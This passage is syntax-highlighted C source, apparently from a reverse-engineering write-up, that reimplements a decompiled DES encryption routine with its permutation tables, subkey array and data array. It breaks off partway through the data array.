class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> byte_7FF65FC709A8<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> __fastcall <span class=\"token function\">des_encrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> DWORD <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> left <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF0F0F0F</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x0000FFFF</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x33333333</span><span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x00FF00FF</span><span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xAAAAAAAA</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> result1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                               s3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                               s5<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                               s7<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n\n        right <span class=\"token operator\">^=</span> s2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 s4<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 s6<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 s8<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 result1<span class=\"token punctuation\">;</span>\n\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        result1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                  s3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                  s5<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                  s7<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n        left <span class=\"token operator\">^=</span> s2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                s4<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                s6<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                s8<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                result1<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xAAAAAAAA</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00FF</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x33333333</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x0F0F0F0F</span><span class=\"token punctuation\">;</span>\n\n    a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x2C0B3C36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09221A0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2829051D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09123B0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C091B18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0512011F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09292E17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07122920</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x090D1703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0514372E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0915123C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27100E27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01050927</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25150D29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13151F32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24112618</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x03052031</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34312B37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13043A05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C19151B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23063B3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34293830</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03062108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x380B3F2A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x260E063D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3009141B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E223D3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x300B0124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x062A1700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11093D14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E22262B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1208083E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x0E22262B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1208083E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x062A1700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11093D14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E223D3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x300B0124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x260E063D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3009141B</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x03062108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x380B3F2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23063B3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34293830</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13043A05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C19151B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03052031</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34312B37</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x13151F32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24112618</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01050927</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25150D29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0915123C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27100E27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x090D1703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0514372E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x09292E17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07122920</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C091B18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0512011F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2829051D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09123B0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C0B3C36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09221A0A</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x00000084</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000003</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000022</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000014</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000BE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000DF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000075</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000D5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000076</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000006F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000CD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000002A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000005D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000D7</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x0000004D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000B2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000005F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000006</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000098</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000009D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000003E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000A8</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000F7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000023</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000008B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000054</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000065</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000007A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000087</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000055</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000D6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000003B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000046</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000003D</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x000000F7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000B2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000007A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000009D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000C2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000CF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000001A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000000AE</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x00000016</span><span class=\"token punctuation\">,</span> <span class=\"token 